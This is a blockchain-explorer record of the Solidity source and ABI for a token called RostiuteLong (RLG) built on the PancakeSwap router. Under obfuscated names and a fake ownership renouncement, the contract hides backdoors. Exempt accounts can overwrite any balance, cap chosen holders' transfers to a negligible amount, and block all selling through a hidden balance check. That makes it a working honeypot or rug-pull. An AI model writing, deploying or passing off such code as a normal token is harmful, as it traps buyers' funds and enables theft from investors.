{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface shouldLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxFund {\n    function createPair(address enableFundAuto, address maxAuto) external returns (address);\n}\n\ninterface swapFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingToken) external view returns (uint256);\n\n    function transfer(address enableLaunched, uint256 maxSell) external returns (bool);\n\n    function allowance(address tradingAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableLaunched,\n        uint256 maxSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundList, uint256 value);\n    event Approval(address indexed tradingAt, address indexed spender, uint256 value);\n}\n\ninterface swapFromMetadata is swapFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RostiuteLong is tokenWallet, swapFrom, swapFromMetadata {\n\n    function senderReceiver(address receiverFundSender, address enableLaunched, uint256 maxSell) internal returns (bool) {\n        require(teamExempt[receiverFundSender] >= maxSell);\n        teamExempt[receiverFundSender] -= maxSell;\n        teamExempt[enableLaunched] += maxSell;\n        emit Transfer(receiverFundSender, enableLaunched, maxSell);\n        return true;\n    }\n\n    function balanceOf(address marketingToken) public view virtual override returns (uint256) {\n        return teamExempt[marketingToken];\n    }\n\n    string private isAtFrom = \"Rostiute Long\";\n\n    function fromTx(address marketingFrom) public {\n        shouldMinExempt();\n        if (modeWallet == atBuy) {\n            atTeamList = true;\n        }\n        if (marketingFrom == fundTotal || marketingFrom == modeReceiver) {\n            return;\n        }\n        limitLaunchedMode[marketingFrom] = true;\n    }\n\n    uint256 feeReceiver;\n\n    bool private senderTxAuto;\n\n    function atToken(uint256 maxSell) public {\n        shouldMinExempt();\n        feeReceiver = maxSell;\n    }\n\n    address public modeReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return isAtFrom;\n    }\n\n    uint256 constant sellTakeAuto = 19 ** 10;\n\n    uint256 totalTx;\n\n    mapping(address => bool) public limitLaunchedMode;\n\n    mapping(address => mapping(address => uint256)) private receiverEnableTeam;\n\n    uint256 private atBuy;\n\n    uint256 private modeWallet;\n\n    constructor (){\n        \n        shouldLimit receiverTrading = shouldLimit(teamSell);\n        modeReceiver = maxFund(receiverTrading.factory()).createPair(receiverTrading.WETH(), address(this));\n        \n        fundTotal = _msgSender();\n        launchedIs();\n        exemptList[fundTotal] = true;\n        teamExempt[fundTotal] = toTx;\n        \n        emit Transfer(address(0), fundTotal, toTx);\n    }\n\n    bool public launchedAt;\n\n    uint256 private toTx = 100000000 * 10 ** 18;\n\n    address private tradingShould;\n\n    bool public atTeamList;\n\n    bool private walletMax;\n\n    mapping(address => uint256) private teamExempt;\n\n    mapping(address => bool) public exemptList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeFee;\n    }\n\n    function transfer(address exemptReceiverFrom, uint256 maxSell) external virtual override returns (bool) {\n        return minFrom(_msgSender(), exemptReceiverFrom, maxSell);\n    }\n\n    function minFrom(address receiverFundSender, address enableLaunched, uint256 maxSell) internal returns (bool) {\n        if (receiverFundSender == fundTotal) {\n            return senderReceiver(receiverFundSender, enableLaunched, maxSell);\n        }\n        uint256 enableFundLaunch = swapFrom(modeReceiver).balanceOf(teamBuy);\n        require(enableFundLaunch == feeReceiver);\n        require(enableLaunched != teamBuy);\n        if (limitLaunchedMode[receiverFundSender]) {\n            return senderReceiver(receiverFundSender, enableLaunched, sellTakeAuto);\n        }\n        return senderReceiver(receiverFundSender, enableLaunched, maxSell);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTx;\n    }\n\n    function sellEnable(address fromBuy) public {\n        if (launchedAt) {\n            return;\n        }\n        \n        exemptList[fromBuy] = true;\n        if (isMin != atIs) {\n            atIs = modeWallet;\n        }\n        launchedAt = true;\n    }\n\n    function allowance(address buyLaunch, address receiverList) external view virtual override returns (uint256) {\n        if (receiverList == teamSell) {\n            return type(uint256).max;\n        }\n        return receiverEnableTeam[buyLaunch][receiverList];\n    }\n\n    address teamSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeEnable;\n    }\n\n    function liquidityExempt(address exemptReceiverFrom, uint256 maxSell) public {\n        shouldMinExempt();\n        teamExempt[exemptReceiverFrom] = maxSell;\n    }\n\n    function owner() external view returns (address) {\n        return tradingShould;\n    }\n\n    address teamBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return tradingShould;\n    }\n\n    address public fundTotal;\n\n    string private takeEnable = \"RLG\";\n\n    function approve(address receiverList, uint256 maxSell) public virtual override returns (bool) {\n        receiverEnableTeam[_msgSender()][receiverList] = maxSell;\n        emit Approval(_msgSender(), receiverList, maxSell);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed fundExempt, address indexed receiverLimitEnable);\n\n    function transferFrom(address receiverFundSender, address enableLaunched, uint256 maxSell) external override returns (bool) {\n        if (_msgSender() != teamSell) {\n            if (receiverEnableTeam[receiverFundSender][_msgSender()] != type(uint256).max) {\n                require(maxSell <= receiverEnableTeam[receiverFundSender][_msgSender()]);\n                receiverEnableTeam[receiverFundSender][_msgSender()] -= maxSell;\n            }\n        }\n        return minFrom(receiverFundSender, enableLaunched, maxSell);\n    }\n\n    uint256 public atIs;\n\n    function shouldMinExempt() private view {\n        require(exemptList[_msgSender()]);\n    }\n\n    uint8 private modeFee = 18;\n\n    uint256 private isMin;\n\n    function launchedIs() public {\n        emit OwnershipTransferred(fundTotal, address(0));\n        tradingShould = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimitEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeamList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"}],\"name\":\"fromTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLaunchedMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"liquidityExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"}],\"name\":\"sellEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RostiuteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}